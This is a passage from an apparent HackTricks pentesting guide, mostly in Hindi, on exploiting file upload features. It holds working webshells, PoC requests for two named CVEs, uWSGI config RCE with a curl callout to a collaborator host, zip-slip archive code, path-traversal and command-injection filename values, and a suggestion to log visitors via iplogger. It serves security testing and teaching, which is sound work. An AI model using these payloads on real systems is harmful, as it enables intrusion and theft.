# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

अन्य उपयोगी एक्सटेंशन्स:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### फ़ाइल एक्सटेंशन चेक बायपास करना

1. अगर लागू होते हैं, तो **पिछले एक्सटेंशन्स को चेक** करें। इन्हें कुछ **uppercase letters** के साथ भी परखें: _pHp, .pHP5, .PhAr ..._
2. _एक मान्य एक्सटेंशन को execution extension से पहले जोड़कर चेक करें (पिछले एक्सटेंशन्स भी इस्तेमाल करें):_
- _file.png.php_
- _file.png.Php5_
3. एंड पर **special characters जोड़ने** की कोशिश करें। आप Burp का उपयोग करके सभी **ascii** और **Unicode** कैरेक्टर्स को **bruteforce** कर सकते हैं। (_नोट: आप पहले बताये गए एक्सटेंशन्स का भी उपयोग कर सकते हैं_) 
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सर्वर-साइड के extension parser को चीट करके protections को बायपास करने की कोशिश करें — जैसे extension को दोहराना या extensions के बीच junk data (**null bytes**) डालना। _बेहतर payload तैयार करने के लिए आप पिछले एक्सटेंशन्स का भी उपयोग कर सकते हैं।_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछले चेक में **एक और लेयर** एक्सटेंशन्स जोड़ें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. निष्पादन योग्य एक्सटेंशन को मान्य एक्सटेंशन से पहले रखने की कोशिश करें और उम्मीद करें कि सर्वर misconfigured हो। (useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
- _ex: file.php.png_
7. **Windows** में NTFS alternate data stream (ADS) का उपयोग। इस केस में, forbidden extension के बाद और permitted extension से पहले एक colon ":" कैरेक्टर डाल दिया जाएगा। परिणामस्वरूप सर्वर पर एक **empty file with the forbidden extension** बना दिया जाएगा (उदा. "file.asax:.jpg"). यह फाइल बाद में अन्य तकनीकों से edit की जा सकती है जैसे इसकी short filename का उपयोग करना। "**::$data**” pattern का उपयोग non-empty files बनाने के लिए भी किया जा सकता है। इसलिए इस pattern के बाद एक dot कैरेक्टर जोड़ना आगे की प्रतिबंधों को बायपास करने में उपयोगी हो सकता है (उदा. "file.asp::$data.")
8. filename limits तोड़ने की कोशिश करें। वैध एक्सटेंशन कट जाता है और malicious PHP बच जाता है। AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. ट्रेलिंग डॉट) – CVE-2024-21546

कुछ upload handlers saved filename से trailing dot characters को trim या normalize कर देते हैं। UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) के versions 2.9.1 से पहले, आप extension validation को बायपास कर सकते हैं:

- एक मान्य image MIME और magic header का उपयोग करें (उदा., PNG का `\x89PNG\r\n\x1a\n`)।
- अपलोड की गई फाइल का नाम PHP extension के बाद एक dot के साथ रखें, उदाहरण के लिए `shell.php.`।
- सर्वर trailing dot को हटा देता है और `shell.php` को persist करता है, जो कि web-served directory (default public storage जैसे `/storage/files/`) में रखा गया हो तो execute हो जाएगा।

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
फिर सेव किए गए पाथ को हिट करें (Laravel + LFM में सामान्यतः):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks करने के लिए **Content-Type** **header** के **value** को सेट करें: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check करने के लिए फाइल की शुरुआत में एक असली image के **bytes** जोड़ें ( _file_ command को confuse करने के लिए)। या shell को **metadata** के अंदर डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे एक image में भी **introduce** कर सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, उदाहरण के लिए कुछ standard PHP libraries जैसे [PHP-GD](https://www.php.net/manual/fr/book.image.php) का उपयोग करते हुए, तो ऊपर की techniques तब उपयोगी नहीं होंगी। हालांकि, आप **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर कुछ text insert कर सकते हैं जो **survive compression** करेगा।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज image को **resizing** भी कर सकता है, उदाहरण के लिए PHP-GD functions `imagecopyresized` या `imagecopyresampled` का उपयोग करते हुए। हालांकि, आप **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर ऐसा text insert कर सकते हैं जो **survive compression** करेगा।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और technique जो एक payload बनाती है जो **image resizing** को सहन कर सके, PHP-GD function `thumbnailImage` का उपयोग करती है। हालांकि, आप **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर ऐसा text insert कर सकते हैं जो **survive compression** करेगा।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- पहले से uploaded file का extension बदलने के लिए उस file को **rename** करने वाली vulnerability खोजें।
- backdoor execute करने के लिए **Local File Inclusion** vulnerability खोजें।
- **Possible Information disclosure**:
1. एक ही file को **कई बार** (और **एक ही समय में**) **एक ही नाम** से upload करें।
2. किसी file या folder के **name** के साथ एक file upload करें जो **पहले से मौजूद** हो।
3. फाइल का नाम **"." , "..", or "…"** रख कर upload करना। उदाहरण के लिए, Apache में **Windows** पर, अगर application uploaded files को "/www/uploads/" directory में save करता है, तो "." filename "/www/" directory में uploads” नाम की file बना देगा।
4. ऐसी file upload करें जिसे आसानी से delete न किया जा सके, जैसे **"…:.jpg"** in **NTFS**। (Windows)
5. **Windows** में ऐसे invalid characters जैसे `|<>*?”` वाले नाम के साथ file upload करें। (Windows)
6. **Windows** में reserved (forbidden) names जैसे CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9 का उपयोग कर file upload करें।
- यह भी कोशिश करें कि कोई **executable** (.exe) या एक **.html** (कम suspicious) upload करें जो victim द्वारा गलती से खोले जाने पर **code execute** कर दे।

### Special extension tricks

यदि आप **PHP server** पर files upload करने की कोशिश कर रहे हैं, तो [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप **ASP server** पर files upload करने की कोशिश कर रहे हैं, तो [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` files `.jar` की तरह हैं java के लिए, पर php के लिए, और इन्हें **php file की तरह use** किया जा सकता है (php के साथ execute करना, या किसी script के अंदर include करना...)।

`.inc` extension कभी-कभी उन php files के लिए इस्तेमाल होता है जो केवल files को **import** करने के लिए होते हैं, इसलिए किसी बिंदु पर किसी ने इस extension को **execute** होने की अनुमति दे रखी हो सकती है।

## **Jetty RCE**

यदि आप Jetty server में एक XML file upload कर सकते हैं तो आप [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)** प्राप्त कर सकते हैं।** तो, जैसा कि निम्नलिखित image में दिखाया गया है, XML file को `$JETTY_BASE/webapps/` में upload करें और shell की उम्मीद रखें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability की विस्तृत जांच के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities को uWSGI servers में exploit किया जा सकता है अगर किसी के पास `.ini` configuration file को modify करने की क्षमता हो। uWSGI configuration files एक विशिष्ट syntax का उपयोग करते हैं ताकि "magic" variables, placeholders, और operators को शामिल किया जा सके। विशेष रूप से, '@' operator, जो `@(filename)` के रूप में उपयोग होता है, एक file की सामग्री को include करने के लिए डिज़ाइन किया गया है। uWSGI में समर्थित विभिन्न schemes में से, "exec" scheme विशेष रूप से शक्तिशाली है, जो किसी process के standard output से data पढ़ने की अनुमति देता है। जब एक `.ini` configuration file process की जाती है, तो इस फीचर का दुरुपयोग Remote Command Execution या Arbitrary File Write/Read जैसे malicious उद्देश्यों के लिए किया जा सकता है।

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

यह समझना महत्वपूर्ण है कि uWSGI की configuration file parsing अपेक्षाकृत lax है। विशेष रूप से, चर्चा किया गया payload किसी भी binary file (जैसे image या PDF) में सम्मिलित किया जा सकता है, जिससे संभावित exploitability और बढ़ जाती है।

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
एक न्यूनतम webshell डालें और commands चलाएँ:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
नोट्स:
- हैंडलर `base64_decode($_POST["img"])` को `;` और `,` से split करने के बाद चलाता है, फिर बाइट्स को `$absolutePath . '/' . $_POST['path']` पर लिखता है बिना extension/type को वैलिडेट किए।
- परिणामस्वरूप कोड वेब सर्विस उपयोगकर्ता के रूप में चलता है (उदा., XAMPP Apache on Windows).

इस बग के संदर्भों में usd HeroLab advisory और NVD entry शामिल हैं। नीचे References सेक्शन देखें।

## **wget फ़ाइल अपलोड/SSRF ट्रिक**

कुछ मामलों में आप पाएंगे कि एक सर्वर फ़ाइलें डाउनलोड करने के लिए **`wget`** का उपयोग कर रहा है और आप **URL** निर्दिष्ट कर सकते हैं। ऐसे मामलों में, कोड यह जांच सकता है कि डाउनलोड की गई फाइलों का extension whitelist में है ताकि केवल अनुमत फाइलें ही डाउनलोड हों। हालांकि, **इस जाँच को बाइपास किया जा सकता है।**\
लिनक्स में **filename** की अधिकतम लंबाई **255** है, हालाँकि, **wget** filenames को **236** characters तक truncate कर देता है। आप **download a file called "A"*232+".php"+".gif"** कर सकते हैं, यह filename **check** को **bypass** कर देगा (जैसा कि इस उदाहरण में **".gif"** एक **valid** extension है) लेकिन `wget` फ़ाइल का नाम बदलकर **"A"*232+".php"** कर देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **एक और विकल्प** जो आप इस check को bypass करने के लिए सोच रहे होंगे वह यह है कि **HTTP server को किसी अलग फ़ाइल पर redirect कर दिया जाए**, ताकि प्रारंभिक URL check को bypass कर दे और तब wget redirected फ़ाइल को नए नाम के साथ डाउनलोड कर ले। यह **काम नहीं करेगा** **जब तक** wget को **parameter** `--trust-server-names` के साथ प्रयोग न किया गया हो क्योंकि **wget redirected पेज को उसी नाम से डाउनलोड करेगा जो original URL में निर्दिष्ट है**।

### NTFS junctions के माध्यम से अपलोड डायरेक्टरी से बाहर निकलना (Windows)

(इस attack के लिए आपको Windows मशीन का local access चाहिए होगा) जब uploads Windows पर per-user subfolders में store किए जाते हैं (उदा., C:\Windows\Tasks\Uploads\<id>\) और आप उस subfolder का creation/deletion नियंत्रित करते हैं, तो आप उसे एक directory junction से बदल सकते हैं जो किसी संवेदनशील स्थान (उदा., webroot) की ओर इशारा करे। इसके बाद आने वाली uploads target path में लिख दी जाएंगी, जिससे code execution संभव हो सकता है यदि target server‑side code को interpret करता है।

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J creates an NTFS directory junction (reparse point). वेब सर्वर के account को junction का पालन करना चाहिए और destination में write permission होना चाहिए।
- यह arbitrary file writes को redirect कर देता है; यदि destination scripts (PHP/ASP) execute करता है, तो यह RCE बन जाता है।
- Defenses: writable upload roots को attacker‑controllable होने की अनुमति न दें जैसे C:\Windows\Tasks के अंतर्गत; junction creation को ब्लॉक करें; extensions को server‑side validate करें; uploads को अलग volume पर स्टोर करें या deny‑execute ACLs के साथ रखें।

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

कुछ upload/ingest handlers raw request body को उस filesystem path पर लिखते हैं जो user-controlled query parameters से बनता है। यदि handler Content-Encoding: gzip को भी सपोर्ट करता है और destination path को canonicalize/validate करने में विफल रहता है, तो आप directory traversal को एक gzipped payload के साथ जोड़कर arbitrary bytes को किसी web-served directory में लिख सकते हैं और RCE प्राप्त कर सकते हैं (उदा., Tomcat के webapps में एक JSP डालना)।

Generic exploitation flow:
- अपने server-side payload (उदा., minimal JSP webshell) तैयार करें और bytes को gzip-compress करें।
- एक POST भेजें जहाँ path parameter (उदा., token) में intended फ़ोल्डर से बाहर निकलने वाला traversal हो, और file उस filename को संकेत करे जिसे persist करना है। Set Content-Type: application/octet-stream और Content-Encoding: gzip; body compressed payload हो।
- लिखी हुई फ़ाइल को ब्राउज़ करें ताकि execution ट्रिगर हो।

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
फिर ट्रिगर करें:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
नोट्स
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- Burp Suite’s Hackvertor extension आपके payload से एक सही gzip body बना सकता है।
- यह एक शुद्ध pre-auth arbitrary file write → RCE pattern है; यह multipart parsing पर निर्भर नहीं करता।

रोकथाम
- Upload गंतव्यों को सर्वर-साइड पर निर्धारित करें; क्लाइंट से आए path fragments पर कभी भरोसा न करें।
- Canonicalize करें और सुनिश्चित करें कि resolved path एक allow-listed मूल निर्देशिका के भीतर ही रहे।
- Uploads को एक non-executable वॉल्यूम पर स्टोर करें और writable paths से script execution को अस्वीकार करें।

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) एक शक्तिशाली उपकरण है जिसे Pentesters और Bug Hunters को file upload mechanisms की टेस्टिंग में मदद करने के लिए डिज़ाइन किया गया है। यह विभिन्न bug bounty techniques का लाभ उठाकर vulnerabilities की पहचान और exploit करने की प्रक्रिया को सरल बनाता है, जिससे web applications का thorough आकलन सुनिश्चित होता है।

### Corrupting upload indices with snprintf quirks (historical)

कुछ legacy upload handlers जो `snprintf()` या समान का उपयोग करके single-file upload से multi-file arrays बनाते हैं, उन्हें `_FILES` structure को forge करने के लिए trick किया जा सकता है। `snprintf()` के व्यवहार में असंगतियों और truncation के कारण, सावधानीपूर्वक तैयार किया गया एक single upload सर्वर-साइड पर कई indexed files के रूप में दिखाई दे सकता है, जिससे ऐसी logic भ्रमित हो सकती है जो एक सख्त shape मानती है (उदा., इसे multi-file upload समझना और unsafe branches लेना)। आज के समय में यह पैटर्न niche है, पर यह कभी-कभी CTFs और पुराने codebases में फिर से उभरता है।

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- अगर आप वेब सर्वर को किसी URL से image पकड़ने के लिए निर्देशित कर सकते हैं तो आप [SSRF](../ssrf-server-side-request-forgery/index.html) का दुरुपयोग करने की कोशिश कर सकते हैं। अगर यह **image** किसी public साइट पर **save** की जा रही है, तो आप [https://iplogger.org/invisible/](https://iplogger.org/invisible/) से एक URL भी संकेत कर सकते हैं और हर visitor की जानकारी **steal** कर सकते हैं।
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- XSS के लिए specially crafted PDFs: [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). अगर आप PDFs upload कर सकते हैं तो आप दिए गए निर्देशों के अनुसार arbitrary JS execute करने वाला कोई PDF तैयार कर सकते हैं।
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content यह जांचने के लिए कि सर्वर पर कोई **antivirus** है या नहीं
- Check if there is any **size limit** uploading files

यहाँ एक शीर्ष 10 सूची है जो आप upload करके हासिल कर सकते हैं (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

अन्य filetypes के लिए refer करें: [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

## Zip/Tar File Automatically decompressed Upload

अगर आप ऐसा ZIP upload कर सकते हैं जिसे सर्वर के अंदर decompressed किया जाएगा, तो आप दो चीजें कर सकते हैं:

### Symlink

ऐसा ZIP अपलोड करें जिसमें अन्य फाइलों के soft links शामिल हों; फिर जब आप decompressed फाइलों को एक्सेस करेंगे तो आप लिंक की गई फाइलों तक पहुँच पाएँगे:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### विभिन्न फ़ोल्डरों में अनज़िप करें

अनज़िपिंग के दौरान डायरेक्टरीज़ में फ़ाइलों का अनपेक्षित निर्माण एक गंभीर समस्या है। प्रारंभिक अनुमान के बावजूद कि यह सेटअप malicious file uploads के जरिए OS-level command execution से रक्षा कर सकता है, ZIP archive format की hierarchical compression support और directory traversal क्षमताओं का दुरुपयोग किया जा सकता है। यह हमलावरों को लक्षित एप्लिकेशन की अनज़िपिंग फ़ंक्शनैलिटी को मैनीपुलेट करके प्रतिबंधों को बायपास करने और secure upload directories से बाहर निकलने की अनुमति देता है।

ऐसी फ़ाइलें बनाने के लिए एक automated exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) पर उपलब्ध है। इस utility का उपयोग निम्नानुसार किया जा सकता है:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अतिरिक्त, **symlink trick with evilarc** एक विकल्प है। यदि उद्देश्य `/flag.txt` जैसी फ़ाइल को लक्षित करना है, तो अपने सिस्टम में उस फ़ाइल का एक symlink बनाना चाहिए। यह सुनिश्चित करता है कि evilarc अपने ऑपरेशन के दौरान त्रुटियों का सामना न करे।

नीचे Python कोड का एक उदाहरण है जिसका उपयोग malicious zip file बनाने के लिए किया गया है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP code is written to execute commands passed through the `$_REQUEST` variable.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Multiple files are created and a zip archive is assembled containing these files.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: The names of the files inside the zip are altered using vi or a hex editor, changing "xxA" to "../" to traverse directories.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

जब backend ZIP एंट्रीज़ को PHP’s ZipArchive का उपयोग करके validate करता है लेकिन extraction raw नामों का उपयोग करके filesystem पर लिखता है, तो आप filename fields में एक NUL (0x00) डालकर एक disallowed extension smuggle कर सकते हैं। ZipArchive entry name को C‑string के रूप में मानता है और पहले NUL पर truncate कर देता है; filesystem पूरा नाम लिखता है, NUL के बाद वाली सभी चीज़ें drop कर देता है।

High-level flow:
- Prepare a legitimate container file (e.g., a valid PDF) that embeds a tiny PHP stub in a stream so the magic/MIME stays a PDF.
- Name it like `shell.php..pdf`, zip it, then hex‑edit the ZIP local header and central directory filename to replace the first `.` after `.php` with `0x00`, resulting in `shell.php\x00.pdf`.
